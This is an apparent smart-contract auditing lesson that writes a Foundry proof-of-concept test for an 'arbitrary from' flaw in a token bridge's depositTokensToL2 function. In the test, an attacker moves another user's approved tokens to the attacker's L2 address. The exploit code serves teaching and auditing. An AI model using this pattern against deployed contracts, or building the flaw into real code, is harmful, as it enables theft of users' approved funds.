---
title: Exploit - Arbitrary From - PoC
---

_Follow along with the video lesson:_

---

### Exploit - Arbitrary From - PoC

Now that we've identified an exploit in the use of an `arbitrary from` in `depositTokensToL2`, let's write a Proof of Code to demonstrate the issue. We can leverage the existing test suite to write our tests.

Navigate to `L1TokenBridge.t.sol`.

This test suite has a decent setup we can leverage, so our user (Alice) is configured with funds already and a vault etc has been prepped for us. Our test should just need to start with Alice, innocently approving the tokens she wants to move to L2.

```js
function testCanMoveApprovedTokensOfOtherUsers() public {
    // poor Alice approving
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);
    vm.stopPrank();
}
```

Now's time for Bob. We're going to set the amountToSteal to Alice's token.balanceOf and create a new attacker user to represent Bob in the transaction. We then prank the attacker.

```js
uint256 amountToSteal = token.balanceOf(user);
address attacker = makeAddr("attacker");
vm.prank(attacker);
```

From here, the order in which we do things in quite important. We know when `depositTokensToL2` is called that an event is emitted and at the root of this vulnerability is that this event is going to be populated with malicious data - Bob's L2 address! In order to detect an event in Foundry's test framework we can use `vm.expectEmit`.

By setting `vm.expectEmit`, _then_ emitting what we expect the function to emit, **_then_** calling that function, the test suite will compare our expectations to what is actually emitted by the function.

```js
vm.expectEmit(address(tokenBridge));
emit Deposit(user, attacker, amountToSteal);
tokenBridge.depositTokensToL2(user, attacker, amountToSteal);
```

And finally, we can close our test off with some assertions. We can show that Bob's transaction left Alice with 0 tokens, and that those tokens are in the vault, waiting to be minting on L2 at the emitted L2 address (Bob's!)

```js
assertEq(token.balanceOf(user), 0);
assertEq(token.balanceOf(address(vault)), amountToSteal);
vm.stopPrank();
```

<details>
<summary>testCanMoveApprovedTokensOfOtherUsers</summary>

```js
function testCanMoveApprovedTokensOfOtherUsers() public {
    // poor Alice approving
    vm.prank(user);
    token.approve(address(tokenBridge), type(uint256).max);
    vm.stopPrank();

    uint256 amountToSteal = token.balanceOf(user);
    address attacker = makeAddr("attacker");
    vm.prank(attacker);
    vm.expectEmit(address(tokenBridge));
    emit Deposit(user, attacker, amountToSteal);
    tokenBridge.depositTokensToL2(user, attacker, amountToSteal);

    assertEq(token.balanceOf(user), 0);
    assertEq(token.balanceOf(address(vault)), amountToSteal);
    vm.stopPrank();
}
```

</details>


Now, we can run this test.

```bash
forge test --mt testCanMoveApprovedTokensOfOtherUsers -vvv
```

![arbitrary-poc1](/security-section-7/20-arbitrary-poc/arbitrary-poc1.png)

### Wrap Up

Boom! A proof of code demonstrating that anyone can call this function on someone elses approved tokens, stealing them on L2.

Our first `High`, we found it pretty quick and `Slither` was a huge help, thanks `Slither`!

Let's keep going, `Slither` had another red detector in that output... See you in the next lesson!
